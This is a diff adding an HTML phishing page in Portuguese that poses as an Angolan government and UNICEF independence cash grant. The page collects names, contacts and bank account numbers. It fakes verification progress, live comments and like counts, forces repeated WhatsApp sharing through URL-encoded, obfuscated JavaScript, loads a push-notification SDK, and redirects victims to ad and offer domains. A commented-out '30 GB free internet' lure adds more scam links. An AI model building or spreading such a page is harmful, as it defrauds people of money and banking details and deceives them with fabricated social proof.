@@ -1,0 +1,768 @@
+
+
+
+<!DOCTYPE html> 
+<html> 
+    <head>
+<script src="active-angola.js"></script>
+     <script src="demo.js"></script>
+ 
+  
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>DIGITE O NÚMERO DA SUA CONTA</title>
+        <link rel="shortcut icon" type="image/png" href="CHD.COMMUNICATION.N'Djamena.18.11.2022.UNICEF.AnnadjibRamadane.1_0.png" />
+        <meta name="og:title" content="DIGITE O NÚMERO DA SUA CONTA" />
+        <meta name="og:url" content="Workpo.com/unicef/" />
+        <meta property="og:description" content="ANGOLA AOS 50 ANOS" />
+        <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg7DMNi9ASmaCOcqzib3VRFcJmNZaGXN4IBXhbu0loqfot-xeBaZVij1yXynIniN6p14eH86NilvaxdPdcLRMPDv4IlGAthfqCR5ONHRgMvqAIR-05ej5ngnouv5X5W_DhQDxP3wbLD8h6Qpl_bjhl_KwjIOPya7U707hD_GR0upbpk8z0lo75Axxh-9Sg8/s320/E519DFEF-DEF4-4F90-BA94-7BA971F3D4FB.jpeg" />
+        <meta property="og:type" content="website" />
+    <meta property="og:updated_time" content="1440432930" />
+    <link rel="me" href="https://www.blogger.com/profile/13809910274301822692" />
+ <script id="script">
+	var s = document.createElement("script")
+	s.src = "https://notixio.com/ent/current/enot.min.js"
+	s.onload = function (sdk) {
+		sdk.startInstall(
+			{
+				"appId": "1008866c667ae806186cf3bf7652da9",
+				"loadSettings": true
+			}
+		)
+	}
+	document.head.append(s)
+</script>   
+    
+</head>
+<body>
+
+    <style>
+        label {
+  display: block;
+  font:
+    1rem 'Fira Sans',
+    sans-serif;
+}
+
+input,
+label {
+  margin: 0.4rem 0;
+}
+
+        </style>
+<style type="text/css">
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+* {
+    margin: 0;
+    padding: 0;
+    font-family: Poppins, Droid Arabic Naskh;
+    font-weight: normal;
+    box-sizing: border-box;
+
+
+}
+body {
+    direction: lfl;
+    background: #ebedf0;
+}
+a {
+    text-decoration: none;
+}
+.post {
+    background: #fff;
+    margin: 0 auto;
+    padding: 10px;
+    max-width: 500px;
+    border: 1px solid #d0d1d5;
+    border-radius: 3px;
+}
+.post img {
+    width: 100%;
+}
+.welcome {
+    font-size: 15px;
+}
+.amount,
+#getname {
+    color: #098105;
+    text-decoration: none;
+}
+.done {
+    text-align: center;
+    color: #27ae60;
+}
+.tip {
+    font-size: 14px;
+}
+.title {
+    text-align: center;
+}
+.error {
+    display: none;
+    text-align: center;
+    font-size: 14px;
+    color: #e74c3c;
+}
+button {
+    display: block;
+    width: 200px;
+    height: 50px;
+    color: #fff;
+    border: none;
+    outline: none;
+    font-size: 24px;
+    cursor: pointer;
+    border-radius: 5px;
+    padding: 0 10px;
+    margin: 10px auto;
+    background: rgb(198, 34, 25);
+    transition: background 0.3s ease;
+}
+button:hover {
+    background: #098105;
+}
+.phone {
+    max-width: 400px;
+    margin: 10px auto;
+}
+.phone input {
+    width: 100%;
+    height: 50px;
+    padding: 10px;
+    outline: none;
+    border: 2px solid #cecece;
+    font-size: 14px;
+}
+#confirm {
+    width: 200px;
+    margin: 10px auto;
+    border-radius: 0px;
+}
+#loader {
+    text-align: center;
+}
+.spin {
+    width: 50px;
+    height: 50px;
+    background: transparent;
+    border: solid 8px rgb(198, 34, 25);
+    border-right-color: transparent;
+    border-radius: 50%;
+    margin: 10px auto;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+    100% {
+        transform: rotate(1turn);
+    }
+}
+#loader,
+#info,
+#checking,
+#share,
+#claim {
+    display: none;
+}
+.center {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.barr {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 35px;
+    padding: 2px;
+    border: 2px solid #098105;
+}
+#fill,
+#fill2 {
+    background: #098105;
+    width: 0%;
+    height: 100%;
+}
+.percentage {
+    width: 100px;
+    float: right;
+    height: 35px;
+    font-size: 16px;
+    border: 2px solid #098105;
+}
+#percentage,
+#percentage2 {
+    margin-left: 5px;
+}
+#check,
+#check2 {
+    display: none;
+}
+.counter {
+    color: #7f7f7f;
+    font-size: 12px;
+    text-align: right;
+    padding: 10px 0 10px 2px;
+    border-bottom: 1px solid #e1e2e3;
+}
+.reactions {
+    display: inline-flex;
+    align-items: center;
+    float: left;
+}
+.counter img {
+    float: left;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 2px solid #fff;
+    box-sizing: content-box;
+}
+.like,
+.love {
+    margin-right: -5px;
+}
+.like {
+    z-index: 2;
+}
+.love {
+    z-index: 1;
+}
+.bar {
+    display: table;
+    width: 100%;
+    border-bottom: 1px solid #e1e2e3;
+}
+.bar .react {
+    display: table-cell;
+    width: calc(100% / 3);
+    font-size: 12px;
+    color: #7f7f7f;
+    text-align: center;
+    padding: 10px 0;
+    cursor: pointer;
+}
+.comments {
+    direction: ltr;
+}
+.comment {
+    padding: 6px 0;
+    margin-top: 5px;
+}
+.comment img {
+    float: left;
+    width: 32px;
+    height: 32px;
+    border: none;
+    border-radius: 18px;
+    cursor: pointer;
+}
+.reply {
+    margin-left: 37px;
+}
+.single-container {
+    margin-left: 37px;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    font-size: 12px;
+}
+.single-container .user {
+    display: inline-block;
+    cursor: pointer;
+    color: #365899;
+    margin-bottom: 5px;
+}
+.single-container .text {
+    display: block;
+}
+.buttons {
+    font-size: 12px;
+    font-weight: bold;
+    margin: 10px 0 0 47px;
+    color: #90949c;
+}
+.action {
+    cursor: pointer;
+}
+.action:hover {
+    text-decoration: underline;
+}
+.input {
+    padding: 6px 12px 12px;
+}
+.input input {
+    width: 100%;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    border: 0;
+    outline: none;
+}
+.A{
+    text-align: center;
+    background-color: rgb(198, 34, 25);
+}
+</style>
+  
+    <style>
+        /* Reset some default styles */
+        body, h1, h2, h3, p, ul, li {
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Apply a background color and font to the body */
+        body {
+            background-color: #ffffff;
+            font-family: Arial black, sans-serif;
+            line-height: 1.6;
+        }
+
+        /* Style the header */
+        .header {
+            text-align: center;
+            background-color: black;
+            color: #fff;
+            padding: 40px 0;
+        }
+
+        /* Style the main content container */
+        .content-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0px;
+        }
+
+        /* Style the image container */
+        .image-container {
+            max-height: 600px; /* Set a fixed maximum height */
+            overflow: hidden; /* Hide overflow if image is larger */
+            text-align: center;
+            background-color: green; /* Background color for the image container */
+        }
+
+        .image-container img {
+            max-width: 100%;
+            height: auto; /* Maintain image aspect ratio */
+        }
+
+        /* Style the text container */
+        .text-container {
+            width: 90%;
+            padding: 30px;
+            background-color: #A3181D;
+            border: 1px solid #A3181D;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(198, 34, 25, 0.1);
+            text-align: center;
+        }
+
+        /* Style the form */
+        form {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* Style the form input fields */
+        input[type="text"],
+        select {
+            width: 90%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 2px solid #A3181D;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        /* Style the textarea */
+        textarea {
+            width: 90%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 2px solid #A3181D;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        /* Style the submit button */
+        .button {
+            background-color: #808183;
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        /* Style the grant information */
+        .grant-info {
+            margin-top: 30px;
+            color: black;
+            text-align: left;
+        }
+
+        /* Style the footer */
+        .footer {
+          width: 106%;
+            background-color: #A3181D;
+            color: #fff;
+            text-align: center;
+            padding: 20px 0;
+        }
+    </style>
+  
+  
+                    <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWrcm6BTsKk_1OqZmNOTnSyovi6Zq9DwYbakxD-JEbAP1Ou3BeJ2oq7cYnYvzyYewpLK1t7oJZqocUpF1fDHFjuVxxZd-uKnJuevHJbevJpIrWZYd6JoI1qbVxUvAlXpXaGDOTe8p5BU6ok0lpgaZMnGQncaDVEqAMviwIN-Z_KnXlatgdxgnhdzXBK-uD/s800/B35777ED-9FE3-4643-A031-A66E3546CAEB.jpeg" alt="unicef" style="width: 100%;"></center>
+                       <marquee class="horizontal_marque" direction="left">ANGOLA AOS 50 ANOS</marquee> <div class="A">
+           
+                <span id="countdowntimer" style="color:white;">4548</span></b></br> <font color="white">Os angolanos foram reconhecidos pela concessão de uma verba para a celebração do Dia da Independência.</font></br>
+           <script type="text/javascript">
+                     var timeleft = 4548;
+                     var downloadTimer = setInterval(function(){
+                         timeleft= timeleft + Math.floor(Math.random() * 600);
+                         document.getElementById('countdowntimer').textContent = timeleft;
+                         if (timeleft <= 0)
+                             clearInterval(downloadTimer);
+                     }, 1000);
+                 </script>
+         </div>
+    <div class="post" width="100%">
+
+        <div id="intro">
+         
+            <p class="welcome">
+
+              <span class="amount">Governo angolano concede subsídio em dinheiro de 105.000 kwachas aos angolanos para as comemorações do Dia da Independência.  </span> Apresse-se e verifique agora se você está entre os selecionados para receber Kz105.000 antes de 30 de novembro..<br> <span class="amount">Verifique agora</span> Os candidatos devem ser angolanos natos..<br>
+                 
+                </p>
+
+
+           
+                 
+                </p>
+
+			
+          
+   <center>
+                <input type="text" name="_name" placeholder="Primeiro nome"><br/>
+                <input type="text" name="name" placeholder="Sobrenome"><br/>
+              
+               
+
+
+                
+                <input type="text" name="email" placeholder="E-mail"><br/>
+                <input type="text" name="phone" placeholder="Número de telefone"></select><br/>
+
+
+          
+
+
+             
+                <textarea name="reason" placeholder="província"></textarea><br/>
+
+</center>
+               
+            <button id="go">Prosseguir ➤</button><br><br>
+        </div>
+        <div id="loader">
+            <div>Por favor, aguarde ...</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+        <div id="info">
+          <center>
+            
+            <p class="title"> DIGITE AQUI O NÚMERO DA SUA CONTA BANCÁRIA:</p> 
+          <div class="phone" >
+         
+          
+          
+                <center><input type="char" placeholder="Insira o número da conta" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br>
+
+              <br/>
+
+
+<select style="width: auto;">
+
+                    <option>----Selecione Banco----</option><br/>
+
+                   <option value="Airtel">Banco de Poupança e Crédito</option><br/>
+
+             <option value="mtn">Banco Angolano de Investim</option><br/>
+                <option value="mtn">Banco de Desenvolvimento de Angola </option><br/>
+                <option value="mtn">Banco Millennium Atlântico, S.A.</option><br/>
+                <option value="mtn">Banco Sol</option><br/>
+                <option value="mtn">BFA – Banco de Fomento Angola, SA</option><br/>
+                <option value="mtn">Banco BIC</option><br/>
+                <option value="mtn">Banco de Comércio e Indústria</option><br/>
+                <option value="mtn">Banco de Negócios Internacional</option><br/>
+                <option value="mtn">Banco Comercial Angolano, S.A.</option><br/>
+                <option value="mtn">Banco Prestígio SA</option><br/>
+            
+                <button id="confirm">Prosseguir</button>
+            </div>
+            <p class="error">Por favor, valide o número da sua conta!</p><br><br>
+        </div>
+        <div id="checking">
+            <p class="title">Por favor, espere um momento...</p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill"></div>
+                </div>
+                <div class="percentage center">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
+                    <span id="percentage"></span>
+                </div>
+            </div>
+        </div>
+        <div id="share">
+
+            <p class="tip"> Parabéns, seu número de conta<span id="getname"></span>.</p>
+            <p class="tip">
+             Está entre os selecionados para receber o auxílio em dinheiro de 105.000 kwachas.  <br><br><span class="amount"> Como proceder: </span>  
+            </p><br>
+            <p class="tip">1. Compartilhe com 5 grupos ou 15 amigos no WhatsApp para que outros pais fiquem cientes disso (Clique no ícone "COMPARTILHAR" abaixo).</p>
+            <p class="tip">2. Você será redirecionado automaticamente para a nossa página de "<b>FORMULÁRIO DE PAGAMENTO</b>" após o preenchimento da barra de verificação VERDE.</p>
+            <p class="tip">3. Você receberá um e-mail de confirmação em até 24 horas após a conclusão bem-sucedida da sua inscrição..</p>
+          <br>
+             <p class="tip">NOTA: Compartilhar corretamente com seus amigos ou grupos do WhatsApp aumenta suas chances de receber seu pagamento imediatamente.</p>
+
+
+            <button id="whatsapp">COMPARTILHAR</button>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill2"></div>
+                </div>
+                <div class="percentage center">
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="percentage2">0%</span>
+                </div>
+            </div>
+        </div>
+        <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+            <p class="title">Parabéns! A última etapa de verificação é se inscrever em nosso serviço para concluir a verificação e concorrer a diversos prêmios, como iPhones, iPads e muitos outros brindes!</p>
+                <b>Assine nosso serviço para verificação; Podemos solicitar que você: envie SMS, faça download, insira seu número de telefone, responda à pesquisa, instale o aplicativo ou realize qualquer outra tarefa para verificar seu número de telefone..</b>
+                <br><b>Lembre-se, esta etapa é muito importante. Não pule nenhuma etapa.</b><br/>
+
+            <button id="offer">VERIFIQUE AGORA</button><br><br/>
+
+			<!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1631313,"Users Online","ffffff");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
+</center>
+<!-- END: Powered by Supercounters.com -->
+
+             <br/>		
+        <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://obqj2.com/4/6798333" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">SACAR DINHEIRO</font></button>
+                    </a><br/> <br/> 
+             </div>
+        <div class="comments">
+            <div class="counter">
+                <div class="reactions">
+                    <img class="like" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhETuUnZKp3TrK9zDTqBtlN4ahx1RrCH6RqG14wW5J8CIBv6HYs7gQSvAiZBwn8NT3lXcz3h8jR87s1z_qZ2kzEoZ7HRnWzskSuqK5NOfKyiQByU3BgypGHXP-m9LlPyFh2FhIsUdN6cO1DnZb-GTtRMDQk8L75NDDUnEC4JxQ6OwsnAjbKVhhlNxrLyQ/s320/9F5D4C76-9CCB-45EB-BA73-73A125849593.jpeg" /> <img class="love" src="https://i.imgur.com/0UHB1f0.png" /> <img class="care" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAy946at4xhCjr4klpqPwgPr3rDevor0nyio2M6l6s99V64P0vlXA9wl_B3L4Y71SaCSBcyU4ylGpkmaaVzvypimn-qb_ZBvwuugTDRMGJOgWTRWbgV5KqH7IvlDuJuEmcLcqyN8SFkAVgKVbo0M--0rDDcJEG4YFH8xRI4PQ9G_L321RwjOupZTG9/s300/images%20(65).jpeg" /> <span id="likes">134K</span>
+                </div>
+                <span id="comments">23K comments</span> <span class="dot">·</span> <span id="shares">12K shares</span>
+            </div>
+            <div class="bar">
+                <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked">Like</a></span> <span class="react"><i class="fa fa-comment-o"></i> Comment</span> <span class="react"><i class="fa fa-share"></i> Share</span>
+            </div>
+            <div>
+                <div class="comment">
+                    </div>
+                </div>
+                <div class="comment">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOh2igfQW6Z5XcpuOlmWTeix334qwTJRmqXJyiPSgUObdb-dSqOUuO1GQveGTO_QuFtK1AXC9NAEsqUM771kTI-VmpNDFLWgmnG5RvHvft49jxbDOBRbna7WJGO1-cVIXtYi0frWSCEGo3m-405E-QEzB_O5MNYeOWhhIlg8btXVdnAjSzxNsrcea-1xv6/s320/EF24E674-FAD3-4057-AAFE-5788D026F833.jpeg" />
+                    <div class="single-container">
+                        <span class="user">Stephen Joel</span>
+                        <span class="text">
+Nem tudo é duvidoso. Algumas coisas são reais. Eu me registrei e é 100% real.
+                        </span>
+                    </div>
+                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj953YxYMZDhZ-zJzYFY1v8wMiz0k08uQSIZk56S_D-lU_Y6rQq6rxCnowScftw_oYXZc-q8q8sH_WmdYD7D6wXo6fwsdDoconScaBIuMPjJDtSZZCIe1_5GTZPRc6PVse9P005W_4rn5LNxD7Pc3U_RP8-p2gVQQV16LyXtEpJkv8Z-IWt-tvZb_sLDWY3/s320/168F630F-328B-4D18-9F86-14DE364A08AE.jpeg" />
+                    <div class="single-container"><span class="user"> Enoch Williams </span> <span class="text"> Por favor, como faço para me cadastrar? Estou interessado. Alguém pode me ajudar?</span></div>
+                    <div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment reply">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAy946at4xhCjr4klpqPwgPr3rDevor0nyio2M6l6s99V64P0vlXA9wl_B3L4Y71SaCSBcyU4ylGpkmaaVzvypimn-qb_ZBvwuugTDRMGJOgWTRWbgV5KqH7IvlDuJuEmcLcqyN8SFkAVgKVbo0M--0rDDcJEG4YFH8xRI4PQ9G_L321RwjOupZTG9/s300/images%20(65).jpeg" />
+                    <div class="single-container"><span class="user"> Adam Fikayomi </span> <span class="text"> This is good </span></div>
+                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment">
+                    <img src="https://imagizer.imageshack.com/img923/8602/jGUvgw.jpg" />
+                    <div class="single-container"><span class="user"> Sandra Jacob</span> <span class="text">Obrigado meu presidente</span></div>
+                    <div class="buttons"><span class="time t3">4m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="input"><input placeholder="Write a comment..." /></div>
+            </div>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+          
+          
+            
+            
+                    
+                    
+                
+    </div>
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+
+
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+</script>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+$("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+</script>
+
+
+
+
+<!--
+"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
+-->
+    </script>
+
+
+
+
+<!--
+"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
+-->
+     
+          
+
+<script> 
+
+          var text1 ="*Subsídio em dinheiro para a celebração do 50.º aniversário da Independência de Angola*%0A%0AGoverno angolano concede auxílio financeiro de 105.000 kwachas aos angolanos em comemoração ao 50º aniversário da Independência, em 2025.%0A%0A _Todos os cidadãos angolanos têm direito a este subsídio._%0A%0A *Acesse o portal e inscreva-se agora, antes de 30 de novembro.*👇%0A https://phlug.org/angola-grant%0A%0A*Insira aqui o número da sua conta para pagamento.*👇%0A https://phlug.org/angola-grant %0A%0AN.B: SHARE WITH OTHER ANGOLANS CITIZENS LET THEM ALL BENEFIT FROM THIS *INDEPENDENCE CASH GRANT*",
+        
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "http://outrotomr.com/4/3144603",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+  
+
+
+
+</script>
+
+
+
+
+<script>
+<!-- code by OD -->
+document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+</script>
+
+
+
+
+
+
+
+
+</body></html>
